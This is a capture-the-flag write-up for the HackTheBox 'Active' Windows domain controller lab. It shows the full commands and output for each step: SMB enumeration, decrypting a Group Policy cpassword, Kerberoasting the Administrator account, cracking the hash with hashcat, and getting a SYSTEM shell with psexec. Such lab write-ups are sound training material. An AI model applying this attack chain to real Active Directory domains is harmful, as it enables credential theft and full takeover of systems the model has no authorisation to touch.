# Active - Easy

Target IP: **10.129.98.16**

## User Flag

Initial scan: ```sudo nmap -sC -sV -p- 10.129.98.16 -v```

Output shows a lot of ports open.

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-06 20:03:24Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

Let's enumerate the SMB server. Smbmap tells us that there is a share we can read.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-m497alerhg]─[~]
└──╼ [★]$ smbmap -H 10.129.98.16

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.98.16:445	Name: 10.129.98.16        	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
	Users                                             	NO ACCESS	
[*] Closed 1 connections                                                                                                     
```

Let's connect to the share.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-m497alerhg]─[~]
└──╼ [★]$ smbclient //10.129.98.16/Replication -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \>
```

Looking further, there is an interesting ```Groups.xml``` file.

```
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 16:46:06 2018

		5217023 blocks of size 4096. 284723 blocks available
```

Let's download this file over to our machine. Looking inside, it lists a ```SVC_TGS``` user and its ```cpassword```.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-m497alerhg]─[~]
└──╼ [★]$ cat Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

```cpassword``` is a vulnerable attribute in Microsoft Group Policy Preferences (GPP). While this is encrypted with AES, Microsoft mistakenly published the encryption key publicly.

We can simply use ```gpp-decrypt``` to get the cleartext password.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-m497alerhg]─[~]
└──╼ [★]$ gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
GPPstillStandingStrong2k18
```

Since we have credentials now, let's check access again on SMB. We have access to the ```users``` share now.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-m497alerhg]─[~]
└──╼ [★]$ smbmap -H 10.129.98.16 -d 'active.htb' -u SVC_TGS -p GPPstillStandingStrong2k18

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.129.98.16:445	Name: 10.129.98.16        	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	
[*] Closed 1 connections                                                                                                     
```

Let's connect to it.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-m497alerhg]─[~]
└──╼ [★]$ smbclient //10.129.98.16/Users -U "active.htb/SVC_TGS%GPPstillStandingStrong2k18"
Try "help" to get a list of possible commands.
smb: \> 
```

```
smb: \SVC_TGS\Desktop\> ls
  .                                   D        0  Sat Jul 21 11:14:42 2018
  ..                                  D        0  Sat Jul 21 11:14:42 2018
  user.txt                           AR       34  Fri Nov  6 15:00:32 2026

		5217023 blocks of size 4096. 278265 blocks available
```

We can proceed to get the user flag from here.

## Root Flag

Let's see if we can perform Kerberoasting.

It seems like an SPN is set for the ```Administrator``` user. Let's grab the password hash using ```GetUserSPNs```.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-m497alerhg]─[~]
└──╼ [★]$ impacket-GetUserSPNs -dc-ip 10.129.98.16 -save -outputfile spns 'active.htb/SVC_TGS:GPPstillStandingStrong2k18'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2026-11-06 15:00:36.520149
```

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-m497alerhg]─[~]
└──╼ [★]$ cat spns
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$7a7379272cd52b25b4e06e3145990b5b$02bf5eb0566cca30ed45deedf23eae576756e8ae579957662bacc29d6996b5756a2a51a87f26d52f7d5d397b2030f46154550858ef0632f7bcd4bf75d1a1d75b196ba3b431f73bcc00aa0c89389c8d3a227f8e8fbeff3e5d72690c2b262a0b85f7d0607dfbde3e94f9d0e43f9852339002957dadd714d1a2f3451aa2e7919b3bd53421831bd58c0e93e6a75f70433d98bd5f733ae234ad6d2eeebbff94bbcf3fef7922ee4739b1c7a279eeaabaf97e382e8251076de6362e3fdb979ffa6ade113feba4be569c1cb4229bacb772e1de8b206a0c2eaeb53f20461e9f8ab10aa4d7c8f4f107c65abc29de45a53a62a8638fe4ecd268ce2414e239628a5fdad87364bcb74dd17d8aa68a44e4efcb42213f4f0315bf20f4754e9babf5d9043cc997163a9512c9e55881c39831567f6521fc4c3d77df99465547ab7e4a1240920c94edf5cd7a1528109e72fc61db63534260d12296aa5dc6b4a820c637a2d0da2b470fff4fd915eedc90dd5e957dfa03e6e051baf1881c225c8d4dccab68bd3bbbf8b0e866a3ca341f693f1a6b51a07e0515aef24f4289bfd0a5ce862eb8cf6da13f86bfeef86ba720ad0247384c5e9da42e45b9028cb271a13aff67c3e039929dcabd5d095bb9365c5d77bf82fbf76505c4010a117c9520d136cb0f7022a5e95dffac0477eddb26b22a5ac4914e9dbeed0232e46bd66afe5292541d55d337ec155475c2ea9c0f517f120e619df2307d9a27575a235ece28874dd68eddf23662499f9c4b469c137f5a3efa6690659ae2b86d9e76ad9eff2d6549c4be196ff555c2270f4a3bafd9c1cd17e00f39a1182745e3f7ddb413627ed17df079362cd96edd2169033a41d96f34848000e54646eafdba2f6ca54dfa23d7270715d3a70ee81394cfeaa9beb0440395c0cae1e7724ad623058a742f0b3ddc9f91fd9807aa1f6bb88e3fabe669adb62ffd40f83d49d4588e5a916016fed77ef5515ec4fba67923c7441c2c15e5b46a2cbbaf352aa19156f4be273d317053200bc797a3c46e3b59e84896fd7363e2748a368ed6c6f39a4081d1a05140f341b0ea4224dc4b6b9d0eb7263b50c6d16c4e558dc7b095dc23e36076f199911e2da4b003985be25c522325887c2c7277f73fad3d593f79c884ea2bfac4afd8a401a9f0c3d591344f6600e18196d1c68c4715a8fbb8e9a87e3f61d0ce9b35e34fa24cda36ab2abb97a84e2334e79d693d7cc5d88f00e8329ca6cd0bc1541cad6f5d6ef426338a
```

We can try cracking this with hashcat.

It works! We now have the cleartext password for ```Administrator```.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-m497alerhg]─[~]
└──╼ [★]$ hashcat -m 13100 spns /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 2.1 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: AMD EPYC 7542 32-Core Processor, 3921/7907 MB (988 MB allocatable), 4MCU

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
====================================================================================================================================================
* Device #2: cpu-haswell-AMD EPYC 7542 32-Core Processor, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$7a7379272cd52b25b4e06e3145990b5b$02bf5eb0566cca30ed45deedf23eae576756e8ae579957662bacc29d6996b5756a2a51a87f26d52f7d5d397b2030f46154550858ef0632f7bcd4bf75d1a1d75b196ba3b431f73bcc00aa0c89389c8d3a227f8e8fbeff3e5d72690c2b262a0b85f7d0607dfbde3e94f9d0e43f9852339002957dadd714d1a2f3451aa2e7919b3bd53421831bd58c0e93e6a75f70433d98bd5f733ae234ad6d2eeebbff94bbcf3fef7922ee4739b1c7a279eeaabaf97e382e8251076de6362e3fdb979ffa6ade113feba4be569c1cb4229bacb772e1de8b206a0c2eaeb53f20461e9f8ab10aa4d7c8f4f107c65abc29de45a53a62a8638fe4ecd268ce2414e239628a5fdad87364bcb74dd17d8aa68a44e4efcb42213f4f0315bf20f4754e9babf5d9043cc997163a9512c9e55881c39831567f6521fc4c3d77df99465547ab7e4a1240920c94edf5cd7a1528109e72fc61db63534260d12296aa5dc6b4a820c637a2d0da2b470fff4fd915eedc90dd5e957dfa03e6e051baf1881c225c8d4dccab68bd3bbbf8b0e866a3ca341f693f1a6b51a07e0515aef24f4289bfd0a5ce862eb8cf6da13f86bfeef86ba720ad0247384c5e9da42e45b9028cb271a13aff67c3e039929dcabd5d095bb9365c5d77bf82fbf76505c4010a117c9520d136cb0f7022a5e95dffac0477eddb26b22a5ac4914e9dbeed0232e46bd66afe5292541d55d337ec155475c2ea9c0f517f120e619df2307d9a27575a235ece28874dd68eddf23662499f9c4b469c137f5a3efa6690659ae2b86d9e76ad9eff2d6549c4be196ff555c2270f4a3bafd9c1cd17e00f39a1182745e3f7ddb413627ed17df079362cd96edd2169033a41d96f34848000e54646eafdba2f6ca54dfa23d7270715d3a70ee81394cfeaa9beb0440395c0cae1e7724ad623058a742f0b3ddc9f91fd9807aa1f6bb88e3fabe669adb62ffd40f83d49d4588e5a916016fed77ef5515ec4fba67923c7441c2c15e5b46a2cbbaf352aa19156f4be273d317053200bc797a3c46e3b59e84896fd7363e2748a368ed6c6f39a4081d1a05140f341b0ea4224dc4b6b9d0eb7263b50c6d16c4e558dc7b095dc23e36076f199911e2da4b003985be25c522325887c2c7277f73fad3d593f79c884ea2bfac4afd8a401a9f0c3d591344f6600e18196d1c68c4715a8fbb8e9a87e3f61d0ce9b35e34fa24cda36ab2abb97a84e2334e79d693d7cc5d88f00e8329ca6cd0bc1541cad6f5d6ef426338a:Ticketmaster1968
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...26338a
Time.Started.....: Fri Nov  6 16:07:42 2026 (6 secs)
Time.Estimated...: Fri Nov  6 16:07:48 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1743.5 kH/s (0.88ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10539008/14344385 (73.47%)
Rejected.........: 0/10539008 (0.00%)
Restore.Point....: 10536960/14344385 (73.46%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Tiffany95 -> Thelittlemermaid

Started: Fri Nov  6 16:07:30 2026
Stopped: Fri Nov  6 16:07:50 2026
```

We can authenticate and get a shell as ```NT AUTHORITY\SYSTEM``` with ```psexec```.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-m497alerhg]─[~]
└──╼ [★]$ impacket-psexec "active.htb/Administrator:Ticketmaster1968@10.129.98.16"
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.98.16.....
[*] Found writable share ADMIN$
[*] Uploading file JeteIjxk.exe
[*] Opening SVCManager on 10.129.98.16.....
[*] Creating service jQIx on 10.129.98.16.....
[*] Starting service jQIx.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

We can proceed to get the root flag from here.

Nice pwn!

## Contact

Email: <johnyang4406@gmail.com>, <john_s_yang@brown.edu>

LinkedIn: <https://www.linkedin.com/in/john-yang-747726292/>

HackTheBox: <https://profile.hackthebox.com/profile/019c423f-9b9b-708f-8b31-55983b89dddd?utm_medium=copy_url/>
